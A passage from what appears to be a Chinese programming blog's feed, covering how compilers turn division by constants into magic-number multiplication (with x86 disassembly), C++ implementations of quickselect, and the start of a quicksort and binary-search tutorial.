&quot;%d&quot;</span><br><span class="line">.text:00401012                 call    printf</span><br><span class="line">.text:00401012</span><br><span class="line">.text:00401017                 add     esp, 8</span><br><span class="line">.text:0040101A                 xor     eax, eax</span><br><span class="line">.text:0040101C                 retn</span><br><span class="line">.text:0040101C</span><br><span class="line">.text:0040101C _main           endp</span><br></pre></td></tr></table></figure><p>上述反汇编结果用到的其实就是一个除法转乘法的运算，前提是除数必须是一个常量，可以在编译期间内计算出来的，原因是下列公式：</p><p style=""><img src="https://math.now.sh?from=%5Cfrac%7BA%7D%7BC%7D%20%3D%20A%20%5Ctimes%20%5Cfrac%7B1%7D%7BC%7D%20%3D%20A%20%5Ctimes%20%5Cfrac%7B2%5En%7D%7BC%7D%5Ctimes%20%5Cfrac%7B1%7D%7B2%5En%7D%20%3D%20A%5Ctimes%20M%20%5Ctimes%20%5Cfrac%7B1%7D%7B2%5En%7D%20%3D%20A%20%5Ctimes%20M%20%3E%3E%20n%0A" /></p><p>需要除数C是一个常量。</p><p>还原时只需要做逆运算：<img src="https://math.now.sh?inline=MagicNum%20%3D%20%5Cfrac%7B2%5En%7D%7BDivisor%7D%20%5Cto%20Divisor%20%3D%20%5Cfrac%7B2%5En%7D%7BMagicNum%7D" style="display:inline-block;margin: 0;"/>​</p><h2 id="总结-3">总结</h2><p>无符号数除以非2的幂的代码定式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov reg, MagicNum</span><br><span class="line">mul x</span><br><span class="line">shr edx, n; 使用edx相当于已经先右移了32位了，最终总的移位次数应该为N = 32 + n</span><br></pre></td></tr></table></figure><p>代码定式使用的是无符号数的运算指令，还原时需要统计一共右移了多少位，然后再使用逆运算还原出除数。</p><p>需要注意的是，编译器在计算魔数<code>MagicNum</code>（就是上面反汇编中的大数）时，是作为无符号数运算的。且由于除数<code>C</code>不是2的幂，编译器在计算<code>MagicNum</code>是要做取下整操作的，因此我们在还原除数的时候，需要<strong>取上整</strong>。</p><h1>有符号数除以非2的幂</h1><p>这篇是一般的常规情况，即：编译器得到的<code>MagicNum</code>无进位现象，无需正负数调整运算结果的情况。</p><h2 id="示例01-除数为正数">示例01 - 除数为正数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     ecx, [esp+arg_0]</span><br><span class="line">.text:00401004                 mov     eax, 66666667h; 注意此时MagicNum是正数</span><br><span class="line">.text:00401009                 imul    ecx</span><br><span class="line">.text:0040100B                 sar     edx, 1; 采用的是有符号运算指令</span><br><span class="line">.text:0040100D                 mov     eax, edx</span><br><span class="line">.text:0040100F                 shr     eax, 1Fh</span><br><span class="line">.text:00401012                 add     edx, eax; 运算结果下整转上整</span><br><span class="line">.text:00401014                 push    edx</span><br><span class="line">.text:00401015                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040101A                 call    printf</span><br><span class="line">.text:0040101A</span><br><span class="line">.text:0040101F                 add     esp, 8</span><br><span class="line">.text:00401022                 xor     eax, eax</span><br><span class="line">.text:00401024                 retn</span><br><span class="line">.text:00401024</span><br><span class="line">.text:00401024 _main           endp</span><br></pre></td></tr></table></figure><p>可以发现，<code>MagicNum</code>是正数，且对于负数的情况，会加1做下整转上整的操作。还原方法与无符号数除以非2的幂的情况一致。</p><h2 id="示例02-除数为负数">示例02 - 除数为负数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">-5</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     ecx, [esp+arg_0]</span><br><span class="line">.text:00401004                 mov     eax, 99999999h; 注意此时是负数，是以补码的形式存放的</span><br><span class="line">.text:00401009                 imul    ecx</span><br><span class="line">.text:0040100B                 sar     edx, 1</span><br><span class="line">.text:0040100D                 mov     eax, edx</span><br><span class="line">.text:0040100F                 shr     eax, 1Fh</span><br><span class="line">.text:00401012                 add     edx, eax</span><br><span class="line">.text:00401014                 push    edx</span><br><span class="line">.text:00401015                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040101A                 call    printf</span><br><span class="line">.text:0040101A</span><br><span class="line">.text:0040101F                 add     esp, 8</span><br><span class="line">.text:00401022                 xor     eax, eax</span><br><span class="line">.text:00401024                 retn</span><br><span class="line">.text:00401024</span><br><span class="line">.text:00401024 _main           endp</span><br></pre></td></tr></table></figure><p>此时<code>MagicNum</code>是负数，在还原的时候，需要先求出其真值，再还原</p><h1>识别定式总结</h1><p>下列总结暂时为不完全的，原因是还有一些特殊情况未被加进来：</p><ol><li>在识别时，先观察是否有加1做调整的操作，如果有且运算指令使用的是有符号运算指令，则被除数是有符号数。</li><li>查看<code>MagicNum</code>是否是负数（大于等于<code>0x8000,0000</code>即为负数）。如果是负数，则除数是负数；否则除数是正数</li></ol><h1>附录</h1><p>对于取整操作的几个有用的性质：</p><ol><li><p>上下取整是相对于0点是对称的，因此对于实数<code>x</code>取上整/下整再取负要变取整方向。如：对<img src="https://math.now.sh?inline=%5Clfloor%20-x%20%5Crfloor" style="display:inline-block;margin: 0;"/>，其结果等于将符号提出，并变取整方向<img src="https://math.now.sh?inline=-%5Clceil%20x%20%5Crceil" style="display:inline-block;margin: 0;"/>。可以利用该性质将取整运算内的符号提出</p></li><li><p>当x为实数时，即：x不为整数时，下整和上整运算的结果相差1</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;大纲&lt;/h1&gt;
&lt;p&gt;本文涉及到的是除法的一般优化方法，其中特殊情况暂时不列举，涉及的知识点有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;被除数是无符号数，除以2的幂&lt;/li&gt;
&lt;li&gt;被除数是有符号数，除以2的幂&lt;/li&gt;
&lt;li&gt;被除数是无符号数，除以非2的幂&lt;/li&gt;
&lt;li&gt;被</summary>
      
    
    
    
    <category term="C/C++逆向" scheme="https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="除法优化" scheme="https://4st.tech/tags/%E9%99%A4%E6%B3%95%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>基础算法：快速选择算法</title>
    <link href="https://4st.tech/2021/08/02/ji-chu-suan-fa-kuai-su-xuan-ze-suan-fa/"/>
    <id>https://4st.tech/2021/08/02/ji-chu-suan-fa-kuai-su-xuan-ze-suan-fa/</id>
    <published>2021-08-02T09:58:53.000Z</published>
    <updated>2021-08-04T04:57:03.045Z</updated>
    
    <content type="html"><![CDATA[<h1>题目要求</h1><p>给定一个长度为<code>n</code>的整数数列，以及一个整数 <code>k</code>，求出数列从小到大排序后的第 <code>k</code>个数。即：从数列中尽可能快的找出第<code>k</code>小的数。</p><h1>分析题目</h1><p>根据上述题目的要求，如果使用排序后，再找第k个数的最低时间复杂度是<code>nlogn</code>的，那么可不可以不通过排序直接得到第k小的数呢？</p><p>根据快速排序中的划分操作，可以知道每一次操作都会把不大于<code>pivot</code>的数放到其左边，把不小于<code>pivot</code>的数放到其右边，每一次都会将一整个数列划分为两组，如果在这个基础上可以知道在<code>pivot</code>的左半边有几个数，就可以知道<code>pivot</code>是第几个小的数，因此就可以判断第<code>k</code>小的数是位于左半边还是右半边，直接就可以舍弃一半的搜索范围。</p><p>根据上述描述， 可以得到其时间复杂度为<code>O(N)</code>，因为其时间复杂度是一个等比数列求和。</p><h1>快速选择算法</h1><h2 id="算法流程">算法流程</h2><ol><li>随机选择一个<code>pivot</code> 进行二分，即：快速排序的划分算法</li><li>统计在划分点<code>pivot</code> 左侧的数的个数，看它与要选择的第<code>k</code>个数的k的大小来缩小搜索区间，以此为基准来判断是选择左半边进行搜索还是右半边进行搜索</li><li>根据夹挤准则，得到第<code>k</code>小的数</li></ol><h2 id="算法的实现">算法的实现</h2><p>该算法的实现有多种版本，只需要能把上述算法流程实现即可。这个算法使用递归来实现比较简单，需要注意递归的三要素：</p><ul><li>递归的定义</li><li>递归的出口</li><li>递归的拆解</li></ul><p>下面几个版本，均要求所求问题的解一定存在，否则代码会出现一些问题。</p><h3 id="版本01">版本01</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> ary[N] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">quickSelect</span><span class="params">(<span class="keyword">int</span> ary[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 03.直接比较个数，当最后是1个的时候，直接返回该区间的第一个元素，就是答案</span></span><br><span class="line">    <span class="keyword">if</span> (k &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ary[lo];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 01.划分区间</span></span><br><span class="line">    <span class="keyword">int</span> left = lo - <span class="number">1</span>, right = hi + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot = ary[left + (right - left) / <span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">do</span> ++left; <span class="keyword">while</span> (ary[left] &lt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> --right; <span class="keyword">while</span> (ary[right] &gt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">            std::<span class="built_in">swap</span>(ary[left], ary[right]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 02.由于外面没有减一，需要加1做调整，然后统计左侧数的个数，然后选择合适的区间进行搜索</span></span><br><span class="line">    <span class="keyword">if</span> (right + <span class="number">1</span> - lo &lt; k) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">quickSelect</span>(ary, right + <span class="number">1</span>, hi, k - right - <span class="number">1</span> + lo);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">quickSelect</span>(ary, lo, right, k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>, k = <span class="number">0</span>; </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;ary[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> num = <span class="built_in">quickSelect</span>(ary, <span class="number">0</span>, n - <span class="number">1</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, num);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="版本02">版本02</h3><p>该版本的作者是<code>yxc</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line"><span class="keyword">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">quick_select</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 03.夹挤准则得到最后答案</span></span><br><span class="line">    <span class="keyword">if</span> (l == r) <span class="keyword">return</span> q[l];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, x = q[l + r &gt;&gt; <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> i ++ ; <span class="keyword">while</span> (q[i] &lt; x);</span><br><span class="line">        <span class="keyword">do</span> j -- ; <span class="keyword">while</span> (q[j] &gt; x);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(q[i], q[j]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将第k小的数，与划分边界进行比较，因为是提前减去1，所以可以直接比较</span></span><br><span class="line">    <span class="comment">// 不需要调整后再比较</span></span><br><span class="line">    <span class="keyword">if</span> (k &lt;= j) <span class="keyword">return</span> <span class="built_in">quick_select</span>(l, j);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">quick_select</span>(j + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提前减1，因为划分后，需要比较边界值，而其划分的边界选择的是闭区间</span></span><br><span class="line">    <span class="comment">// 所以需要提前减1</span></span><br><span class="line">    k -- ;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">quick_select</span>(<span class="number">0</span>, n - <span class="number">1</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="版本03">版本03</h2><p>可以根据01和02可以得到一个版本3：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> ary[N] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">quickSelect</span><span class="params">(<span class="keyword">int</span> ary[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 03.此时答案集合里面只有一个唯一解，该解就是答案</span></span><br><span class="line">    <span class="keyword">if</span> (lo == hi) &#123;</span><br><span class="line">        <span class="keyword">return</span> ary[lo];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 01.划分区间</span></span><br><span class="line">    <span class="keyword">int</span> left = lo - <span class="number">1</span>, right = hi + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot = ary[left + (right - left) / <span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">do</span> ++left; <span class="keyword">while</span> (ary[left] &lt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> --right; <span class="keyword">while</span> (ary[right] &gt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">            std::<span class="built_in">swap</span>(ary[left], ary[right]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 02.由于外面没有减一，需要加1做调整，然后统计左侧数的个数，然后选择合适的区间进行搜索</span></span><br><span class="line">    <span class="keyword">if</span> (right &lt; k - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">quickSelect</span>(ary, right + <span class="number">1</span>, hi, k);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">quickSelect</span>(ary, lo, right, k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>, k = <span class="number">0</span>; </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;ary[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> num = <span class="built_in">quickSelect</span>(ary, <span class="number">0</span>, n - <span class="number">1</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, num);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目要求&lt;/h1&gt;
&lt;p&gt;给定一个长度为&lt;code&gt;n&lt;/code&gt;的整数数列，以及一个整数 &lt;code&gt;k&lt;/code&gt;，求出数列从小到大排序后的第 &lt;code&gt;k&lt;/code&gt;个数。即：从数列中尽可能快的找出第&lt;code&gt;k&lt;/code&gt;小的数。&lt;/p&gt;
&lt;h1&gt;分析</summary>
      
    
    
    
    <category term="算法" scheme="https://4st.tech/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="快速选择算法" scheme="https://4st.tech/tags/%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9%E7%AE%97%E6%B3%95/"/>
    
    <category term="快速排序" scheme="https://4st.tech/tags/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>基础算法：排序和二分</title>
    <link href="https://4st.tech/2021/05/18/ji-chu-suan-fa-pai-xu-he-er-fen/"/>
    <id>https://4st.tech/2021/05/18/ji-chu-suan-fa-pai-xu-he-er-fen/</id>
    <published>2021-05-18T00:40:17.000Z</published>
    <updated>2021-08-06T09:06:59.310Z</updated>
    
    <content type="html"><![CDATA[<h1>大纲</h1><p>排序：</p><ul><li>快速排序</li><li>归并排序</li></ul><p>二分：</p><ul><li>整数二分</li><li>浮点数二分</li></ul><p>学习方法：</p><ul><li>学习代码的思想</li><li>理解并记忆代码模板</li><li>模板题进行熟练，每道题一般重复3-5次即可。</li></ul><h1>排序</h1><h2 id="快速排序">快速排序</h2><h3 id="基本思想">基本思想</h3><p>分治的思想。</p><ol><li><p>确定分界点（指的是数组中的某一个数，而不是该数对应的数组下标）。随便从数组中找一个数，作为我们的分界点。有几种常用的方法：</p><ul><li>取左边界，q[l]</li><li>取右边界，q[r]</li><li>取中间点，q[(l + r) / 2]</li><li>随机取</li></ul></li><li><p>划分区间。根据上述选取的分界点，将整个数组分成两半，把小于等于分界点的值放到数组的左边，把大于等于分界点的值放到数组的右边。注意要求的是两个部分都是<strong>小于等于</strong>。</p></li><li><p>递归处理，即：重复上述的操作，递归处理左右两个子区间。</p></li></ol><h3 id="快速排序的难点和重点">快速排序的难点和重点</h3><p>在第二个划分区间（调整区间上）。首先要明确目标：通过某一种简单高效的方式，将数组中小于等于分界点的数放到数组的左半边，大于等于分界点的数放到数组的右半边。</p><p>输入的数据是数组的左右两个边界下标，是闭区间<code>[lo, hi]</code></p><p>可以暴力处理，额外的开辟两个数组，将大于等于分界点的数放到一个临时数组中，同时将小于等于分界点的数放到另一个临时数组中。让后将这两个数组合并到原来的数组中即可。</p><p>较为优雅的方法是双指针法：</p><ol><li>将数组虚拟添加两个哨兵节点。最左侧的哨兵节点为负无穷，最右边的哨兵节点为正无穷，两个指针的初始位置分别指向这两个虚拟哨兵节点，即：</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> left = lo - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> right = hi + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>为什么要这么设置？因为我们在移动的时候不管三七二十一，都是指针先前进一步，然后再进行判断的。所以需要先让出一个位置，避免漏掉需要判断的数据。</p><ol start="2"><li><p>左侧的指针先行，当其指向的数组中的值小于分界点时，指针继续向右走（因为此时这个数应该位于数组的左半边，不用进行交换等额外操作）；如果指针指向的数组中的值大于等于分界点，此时左侧的指针停下。</p></li><li><p>右侧的指针后行，当期指向的数组中的值大于分界点时，指针继续向左走（因为此时这个数应该位于数组的右半边，不用进行交换等额外操作）；如果指针指向的数组中的值小于等于分界点时，此时右侧的指针停下</p></li><li><p>交换这两个指针指向的数组中的值，并左侧指针和右侧指针分别前进一步，然后继续上述2-3的操作。</p></li></ol><p>为什么上述做法是正确的？假设在任意时刻t，此时观察左侧指针的左半边的数据的情况，其都是小于等于分界点的（因为如果是大于等于分界点的，此时已经交换了；右半边的小于等于分界点的也交换过来了）；同理，右侧指针的右半边的数据都是大于等于分界点的。所以当两个指针相遇或穿过，则满足上述我们的要求。</p><p>描述上述操作的关键点是，终止条件是什么？两个指针相遇或步过。</p><h3 id="递归处理时的注意要点">递归处理时的注意要点</h3><p>在递归处理的时候，只要是对称的进行处理即可，如果写的是<code>right</code>，则右半的起始位置是<code>right + 1</code> ；如果要用<code>left</code>，则左半边是<code>left-1</code> ，而右半边的起始位置就是<code>left</code> 了。</p><p>但是如果你要用<code>left</code> 来做区间划分的边界下标，则需要注意你取的那个分界点不能是左侧边界点，即：<code>ary[left]</code> ，应该是<code>ary[right]</code> 或者其他选取方法（但是一定要上取整，不能取得左边界left这个位置），否则可能会出现边界死循环的问题。同理，如果选择的是<code>right</code> 来做区间划分的边界下标，则需要注意取的分界点不能是右侧边界点。</p><p>为什么会出现死循环呢？举个例子，<code>ary = [1, 2]</code> （递增数列），此时根据上述划分方法，则一个数组是空的，另一个是原数组，问题的规模并没有缩减，从而导致死循环，直到爆栈退出。</p><h3 id="快速排序的一种模板">快速排序的一种模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 